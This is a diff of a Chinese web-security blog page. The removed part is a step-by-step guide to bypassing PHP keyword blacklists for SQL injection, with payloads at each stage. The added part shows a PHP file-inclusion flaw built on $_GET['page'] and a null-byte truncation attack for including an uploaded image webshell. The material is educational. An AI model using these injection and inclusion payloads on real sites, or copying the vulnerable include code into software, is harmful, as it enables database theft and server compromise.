+<pre><code class="php">&lt;?php
+    if(isset($_GET[&#39;page&#39;])) {
+        include $_GET[&#39;page&#39;].&quot;.php&quot;;
+    } else {
+        include &#39;home.php&#39;;
+    }    
+?&gt;
 </code></pre>
-<p>下面这种方式你需要先知道一些表和字段名</p>
-<h3 id="2-过滤关键字-and-or-union"><a href="#2-过滤关键字-and-or-union" class="headerlink" title="2. 过滤关键字: and or union"></a>2. 过滤关键字: and or union</h3><p>php代码</p>
-<pre><code class="php">preg_match(&#39;/(and|or|union)/i&#39;,$id)
-</code></pre>
-<p>会过滤的代码</p>
-<pre><code class="sql">union select user,password from users
-</code></pre>
-<p>绕过方式</p>
-<pre><code class="sql">1 &amp;&amp; (select user from users where user_id=1)=&#39;admin&#39;
-</code></pre>
-<h3 id="3-过滤关键字-and-or-union-where"><a href="#3-过滤关键字-and-or-union-where" class="headerlink" title="3. 过滤关键字 and or union where"></a>3. 过滤关键字 and or union where</h3><p>php代码</p>
-<pre><code class="php">preg_match(&#39;/(and|or|union)/i&#39;,$id)
-</code></pre>
-<p>会过滤的代码</p>
-<pre><code class="sql">1 &amp;&amp; (select user from users where user_id = 1) = &#39;admin&#39;
-</code></pre>
-<p>绕过方式</p>
-<pre><code class="sql">1 &amp;&amp; (select user from users limit 1) = &#39;admin&#39;
-</code></pre>
-<h3 id="4-过滤关键字-and-or-union-where-limit"><a href="#4-过滤关键字-and-or-union-where-limit" class="headerlink" title="4. 过滤关键字: and or union where limit"></a>4. 过滤关键字: and or union where limit</h3><p>php代码</p>
-<pre><code class="php">preg_match(&#39;/(and|or|union|where|limit)/i&#39;, $id)
-</code></pre>
-<p>会过滤的攻击代码</p>
-<pre><code class="sql">1 &amp;&amp; (select user from users limit 1) = &#39;admin&#39;
-</code></pre>
-<p>绕过方式</p>
-<pre><code class="sql">1 &amp;&amp; (select user from users group by user_id having user_id = 1) = &#39;admin&#39;     #user_id聚合中user_id为1的user为admin
-</code></pre>
-<h3 id="5-过滤关键字-and-or-union-where-limit-group-by"><a href="#5-过滤关键字-and-or-union-where-limit-group-by" class="headerlink" title="5. 过滤关键字: and or union where limit group by"></a>5. 过滤关键字: and or union where limit group by</h3><p>php代码</p>
-<pre><code class="php">preg_match(&#39;/(and|or|union|where|limit|group by)/i&#39;, $id)
-</code></pre>
-<p>会过滤的攻击代码</p>
-<pre><code class="sql">1 &amp;&amp; (select user from users group by user_id having user_id = 1) = &#39;admin&#39;
-</code></pre>
-<p>绕过方式</p>
-<pre><code class="sql">1 &amp;&amp; (select substr(group_concat(user_id),1,1) user from users ) = 1
-</code></pre>
-<h3 id="6-过滤关键字-and-or-union-where-limit-group-by-select"><a href="#6-过滤关键字-and-or-union-where-limit-group-by-select" class="headerlink" title="6. 过滤关键字: and or union where limit group by select"></a>6. 过滤关键字: and or union where limit group by select</h3><p>php代码</p>
-<pre><code class="php">preg_match(&#39;/(and|or|union|where|limit|group by|select)/i&#39;, $id)
-</code></pre>
-<p>会过滤的攻击代码</p>
-<pre><code class="sql">1 &amp;&amp; (select substr(gruop_concat(user_id),1,1) user from users) = 1
-</code></pre>
-<p>绕过方式</p>
-<pre><code class="sql">1 &amp;&amp; substr(user,1,1) = &#39;a&#39;
-</code></pre>
-<h3 id="7-过滤关键字-and-or-union-where-limit-group-by-select-‘"><a href="#7-过滤关键字-and-or-union-where-limit-group-by-select-‘" class="headerlink" title="7. 过滤关键字: and or union where limit group by select ‘"></a>7. 过滤关键字: and or union where limit group by select ‘</h3><p>php代码</p>
-<pre><code class="php">preg_match(&#39;/(and|or|union|where|limit|group by|select|\&#39;)/i&#39;, $id)
-</code></pre>
-<p>会过滤的攻击代码</p>
-<pre><code class="sql">1 &amp;&amp; (select substr(gruop_concat(user_id),1,1) user from users) = 1
-</code></pre>
-<p>绕过方式</p>
-<pre><code class="sql">1 &amp;&amp; user_id is not null 1 &amp;&amp; substr(user,1,1) = 0x61 1 &amp;&amp; substr(user,1,1) = unhex(61)
-</code></pre>
-<h3 id="8-过滤关键字-and-or-union-where-limit-group-by-select-‘-hex"><a href="#8-过滤关键字-and-or-union-where-limit-group-by-select-‘-hex" class="headerlink" title="8. 过滤关键字: and or union where limit group by select ‘ hex"></a>8. 过滤关键字: and or union where limit group by select ‘ hex</h3><p>php代码</p>
-<pre><code class="php">preg_match(&#39;/(and|or|union|where|limit|group by|select|\&#39;|hex)/i&#39;, $id)
-</code></pre>
-<p>会过滤的攻击代码</p>
-<pre><code class="sql">1 &amp;&amp; substr(user,1,1) = unhex(61)
-</code></pre>
-<p>绕过方式</p>
-<pre><code>1 &amp;&amp; substr(user,1,1) = lower(conv(11,10,16)) #十进制的11转化为十六进制，并小写。
-</code></pre><h3 id="9-过滤关键字-and-or-union-where-limit-group-by-select-‘-hex-substr"><a href="#9-过滤关键字-and-or-union-where-limit-group-by-select-‘-hex-substr" class="headerlink" title="9. 过滤关键字:and or union where limit group by select ‘ hex substr"></a>9. 过滤关键字:and or union where limit group by select ‘ hex substr</h3><p>php代码</p>
-<pre><code class="php">preg_match(&#39;/(and|or|union|where|limit|group by|select|\&#39;|hex|substr)/i&#39;, $id)
-</code></pre>
-<p>会过滤的攻击代码</p>
-<pre><code class="sql">1 &amp;&amp; substr(user,1,1) = lower(conv(11,10,16))
-</code></pre>
-<p>绕过方式</p>
-<pre><code class="sql">1 &amp;&amp; lpad(user,7,1)
-</code></pre>
-<h3 id="10-过滤关键字-and-or-union-where-limit-group-by-select-‘-hex-substr-空格"><a href="#10-过滤关键字-and-or-union-where-limit-group-by-select-‘-hex-substr-空格" class="headerlink" title="10. 过滤关键字:  and or union where limit group by select ‘ hex substr 空格"></a>10. 过滤关键字:  and or union where limit group by select ‘ hex substr 空格</h3><p>php代码</p>
-<pre><code class="php">preg_match(&#39;/(and|or|union|where|limit|group by|select|\&#39;|hex|substr|\s)/i&#39;, $id)
-</code></pre>
-<p>会过滤的攻击代码</p>
-<pre><code class="sql">1 &amp;&amp; lpad(user,7,1)
-</code></pre>
-<p>绕过方式</p>
-<pre><code class="sql">1%0b||%0blpad(user,7,1)
-</code></pre>
+<p>当进行文件包含时，不需要传输文件扩展名，这样就可以变相的修复包含漏洞</p>
+<p>假设上传一句话图片木马文件的路径为/uploadfile/20130606.jpg，当包含这样的图片。URL: HTTP://<a href="http://www.xxser.com/index.php?page=./uploadfile/20130606.jpg,在PHP却会包含/uploadfile/20130606.jpg.php，而20130606.jpg.php是不存在的，使得包含漏洞无法利用" target="_blank" rel="noopener">www.xxser.com/index.php?page=./uploadfile/20130606.jpg,在PHP却会包含/uploadfile/20130606.jpg.php，而20130606.jpg.php是不存在的，使得包含漏洞无法利用</a></p>
+<p>攻击者可以使用截断的方法突破代码</p>
+<p>URL:</p>
+<p> <a href="http://www.xxser.com/index.php?page=1.jpg" target="_blank" rel="noopener">http://www.xxser.com/index.php?page=1.jpg</a></p>
+<p> 1.pg代码为&lt;?php phpinfo();?&gt;</p>
+<p>Warning: include(1.jpg.php) [function.include]： failed to open stream: No such file or directory in …</p>
+<p>因为找不到 1.jpg.php，所以无法包含，现在输入: </p>
+<pre><code>http://www.xsser.com/index.php?page=1.jpg%00
+</code></pre><p>结果返回phpinfo()的信息</p>
+<p>这种方法只适用于magic_quotes_gpc=Off时，开启时%00会被转义</p>
 
         
     
@@ -643,21 +686,13 @@ select * from news limit 1 offset 0
             <nav class="material-nav mdl-color-text--grey-50 mdl-cell mdl-cell--12-col">
     <!-- Prev Nav -->
     
-        <a href="/2018/05/24/3/" id="post_nav-newer" class="prev-content">
-            <button class="mdl-button mdl-js-button mdl-js-ripple-effect mdl-button--icon mdl-color--white mdl-color-text--grey-900" role="presentation">
-                <i class="material-icons">arrow_back</i>
-            </button>
-            &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
-            Newer
-        </a>
-    
 
     <!-- Section Spacer -->
     <div class="section-spacer"></div>
 
     <!-- Next Nav -->
     
-        <a href="/2018/05/24/1/" id="post_nav-older" class="next-content">
+        <a href="/2018/05/29/10/" id="post_nav-older" class="next-content">
             Older
             &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
             <button class="mdl-button mdl-js-button mdl-js-ripple-effect mdl-button--icon mdl-color--white mdl-color-text--grey-900" role="presentation">
